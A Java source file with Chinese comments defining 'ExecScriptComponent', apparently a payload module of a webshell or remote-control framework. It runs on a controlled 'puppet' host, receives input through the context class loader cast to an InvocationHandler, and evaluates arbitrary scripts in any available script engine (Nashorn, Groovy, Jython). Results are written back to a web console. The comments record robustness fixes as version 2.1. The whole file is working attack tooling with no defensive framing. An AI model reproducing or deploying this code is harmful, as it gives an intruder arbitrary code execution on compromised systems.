package org.leo.core.component;

import java.lang.reflect.InvocationHandler;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.util.HashMap;

/**
 * 脚本执行组件（在 puppet 上跑）。
 *
 * <p>调用约定与 {@link PluginComponent} 一致：
 * <ul>
 *   <li>puppet 把当前线程 contextClassLoader cast 成 InvocationHandler 作为参数/结果通道</li>
 *   <li>{@code h.invoke(null, null, null)} 取入参</li>
 *   <li>{@code h.invoke(null, null, new Object[]{results})} 回写结果</li>
 * </ul>
 *
 * <p>关键修复点（相对旧版本）：
 * <ol>
 *   <li>{@code run()} 用 {@code catch (Throwable)} 兜底，确保 results 永远会被回写，
 *       避免 puppet 返回空响应导致 web 端解码失败 (data.length≠0 但 map 为空)。</li>
 *   <li>显式判空 {@code engine == null}，给出明确错误信息（如 JDK 15+ 默认无 Nashorn）。</li>
 *   <li>script 结果用 {@code String.valueOf(...)}，primitive 类型不会被 Disguise 序列化时丢掉。</li>
 * </ol>
 *
 * <p>兼容 Java 1.5+，避免使用 lambda、try-with-resources、新集合 API。
 *
 * @author LeoSpring
 * @version 2.1
 */
public class ExecScriptComponent implements Runnable {

    private HashMap params;
    private HashMap results;

    public void run() {
        InvocationHandler h = (InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (HashMap) h.invoke(null, null, null);
            results = new HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) {
                results = new HashMap();
            }
            results.put("code", Integer.valueOf(500));
            String msg = t.getMessage();
            results.put("msg", msg != null ? msg : t.getClass().getName());
        }
        // 无论成功失败都必须回写 results，否则 web 端 decode 出空 map 报「响应解码结果为空」
        try {
            h.invoke(null, null, new Object[]{results});
        } catch (Throwable ignored) {
        }
    }

    public void invoke() throws Exception {
        String language = (String) params.get("language");
        String script = (String) params.get("script");

        if (language == null || language.trim().length() == 0) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "language 不能为空");
            return;
        }
        if (script == null || script.trim().length() == 0) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "script 不能为空");
            return;
        }

        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName(language);
        if (engine == null) {
            results.put("code", Integer.valueOf(500));
            results.put("msg",
                    "找不到 ScriptEngine: " + language
                    + "（puppet JDK 可能不带该引擎；JDK 15+ 默认无 Nashorn JS，"
                    + "需手动添加 nashorn-core / groovy-jsr223 / jython 等 jar 到 classpath）");
            return;
        }

        try {
            Object result = engine.eval(script);
            // String.valueOf(null) → "null"，这里用三元区分 null/非 null
            results.put("result", result == null ? "" : String.valueOf(result));
            results.put("code", Integer.valueOf(200));
        } catch (ScriptException e) {
            results.put("code", Integer.valueOf(500));
            String msg = e.getMessage();
            results.put("msg", "脚本执行异常: " + (msg != null ? msg : e.getClass().getName()));
        }
    }
}
